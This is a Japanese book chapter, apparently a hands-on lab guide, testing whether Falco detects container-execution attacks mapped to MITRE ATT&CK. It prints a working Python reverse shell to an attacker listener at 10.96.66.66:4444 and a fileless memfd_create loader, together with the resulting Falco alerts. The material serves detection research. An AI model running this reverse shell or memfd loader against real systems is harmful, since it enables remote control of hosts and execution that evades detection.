---
title: "第5章：Execution - コンテナ内部での不正実行"
---

# 第5章：Execution - コンテナ内部での不正実行

## この章で学ぶこと

- 侵入後、攻撃者がコンテナ内でどう実行環境を確保するか
- Lab 5〜6の実験手順とFalcoでの観測結果（実機検証）
- 「ファイルを残さない」実行手法に対する検知の強み・弱み

前章でコンテナへの足がかりを得た攻撃者は、次に**継続的に実行できる環境**を確保しようとします。本章ではMITRE ATT&CK for Containersの**Execution**戦術に対応する2本の実験を扱います。

---

## Lab 5: シェル起動・リバースシェル確立

- **MITRE ATT&CK for Containers**: T1059 (Command and Scripting Interpreter)
- **前提**: Lab 1の脆弱性を使い、クラスタ内の攻撃者リスナー（`attacker-listener`、固定ClusterIP `10.96.66.66:4444`）に対してPythonベースのリバースシェルを確立

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.96.66.66",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

**結果**: リバースシェルが確立し、攻撃者リスナー側で`/ #`というシェルプロンプトを取得できた。

### 実機検証で判明した訂正：ルール名は「Reverse Shell Detected」ではない

当初「`Reverse Shell Detected`という標準ルールが発火する」と書いていたが、**この名前のルールはFalcoに存在しなかった**。実際に発火したのは、`dup3`システムコールでstdin/stdout/stderrがネットワークfdに繋ぎ替えられる瞬間を検知する標準ルール`Redirect stdout/stdin to network connection`：

```
Notice Redirect stdout/stdin to network connection |
  fd.sip=10.96.66.66 connection=10.244.2.3:41008->10.96.66.66:4444
  process=python3 parent=sh command=python3 -c import socket,subprocess,os;...
```

このルールには第4章で問題になった`proc.tty`条件が無く、**TTYの有無に関わらず発火する**。加えて、第4章で修正した自前のカスタムルール`Shell Spawned Without TTY`も重ねて発火した。

**考察**: 第4章とは対照的に、**この段階は本書の仮説（「Execution段階はFalcoが強い」）が実機でも裏付けられた**。ただし、具体的なルール名の訂正は必要。dup2/dup3によるfd置き換えという、**TTYの有無に依存しない「リバースシェルの本質的な挙動」そのもの**を見ているのがこのルールの強みだと分かる。

## Lab 6: ファイルレス実行（メモリ上での実行）

- **MITRE ATT&CK for Containers**: T1059.004 (Unix Shell), T1620 (Reflective Code Loading)
- **前提**: `os.memfd_create`でディスクに書き込まず、メモリ上に展開したバイナリをexecする

### 実機検証で判明した誤り：シェバンスクリプトでは「ファイルレス」にならない

最初に試した実装は、memfdに`#!/bin/sh`で始まるシェルスクリプトを書き込み、execするものだった。これは実行自体は成功するが、**Falcoの`proc.exepath`はディスク上の実体（`/bin/busybox`）を指しており、`memfd:`にはならなかった**。

理由：シェバン行のあるスクリプトをexecすると、カーネルの`binfmt_script`機構が**本当のインタプリタ（`/bin/sh`の実体である`/bin/busybox`）を改めてディスクから**ロードする。memfd上のスクリプトは「どのインタプリタに何を食わせるか」の指示書に過ぎず、**実際に実行される機械語はディスク上のバイナリ**。これでは「ファイルレス実行」の体をなしていない。

### 修正：ELFバイナリ自体をmemfdに展開（実機確認済み）

```python
import os
with open("/bin/busybox", "rb") as f:
    data = f.read()
fd = os.memfd_create("payload")
os.set_inheritable(fd, True)
os.write(fd, data)
os.execv("/proc/self/fd/%d" % fd, ["busybox", "sh", "-c", "echo FILELESS_EXEC_OK; id"])
```

（`/bin/busybox`の実体を読み出し、そのバイト列をそのままmemfdに書いてexec。busyboxはmulti-callバイナリなので、argvの与え方でシェルとして振る舞わせる。）

**結果**: 攻撃は成立し、正しく検知もされた：

```
Critical Fileless execution via memfd_create |
  process=3 proc_exepath=memfd:payload command=3 sh -c echo FILELESS_EXEC_OK; id
  exe_flags=EXE_WRITABLE|EXE_FROM_MEMFD container_name=app pod=vulnerable-webapp-... ns=lab
```

`proc_exepath=memfd:payload`で正しく「ディスク実体を持たない」ことが示されている。さらに、Falcoの内部フラグに**専用の`EXE_FROM_MEMFD`フラグ**が用意されていることも実機で確認できた。本書のカスタムルールは`proc.exepath`の文字列マッチで実装しているが、`exe_flags`を直接見る方がより頑健な実装になる可能性がある。

**考察**: 「シェバンスクリプトをmemfdに置けばファイルレス実行になる」という単純な理解は不正確だった。真にファイルレスなのは、**ELFバイナリそのものをmemfdに展開してexecする**ケースのみ。この区別は、ファイルレスマルウェアの実装・検知どちらを考える上でも本質的な論点になる。

---

## 本章のまとめ

| Lab | 手法 | 標準ルールで検知 | ポイント |
|---|---|---|---|
| 5 | リバースシェル | ✅（ルール名は要訂正） | dup2/dup3の検知はTTY非依存で頑健 |
| 6 | ファイルレス実行（memfd_create） | ❌（カスタムルールで検知） | シェバン経由は真のファイルレスにならない |

Execution段階は、**本書で扱う8フェーズの中でも実機検証の結果が比較的良好だった領域**です（ルール名の訂正は必要だが、検知の実効性自体は確認できた）。次章では、侵入したコンテナの中から一歩外へ出ようとする「Privilege Escalation（権限昇格）」を扱います。

## 参考資料

- [MITRE ATT&CK T1059: Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
- [MITRE ATT&CK T1620: Reflective Code Loading](https://attack.mitre.org/techniques/T1620/)
- [memfd_create(2) — Linux manual page](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [Falco Default Rules（falcosecurity/rules）](https://github.com/falcosecurity/rules)
- [k8s-attack-runtime-security-lab（本書の実験コード一式）](https://github.com/keitahigaki-prog/k8s-attack-runtime-security-lab)
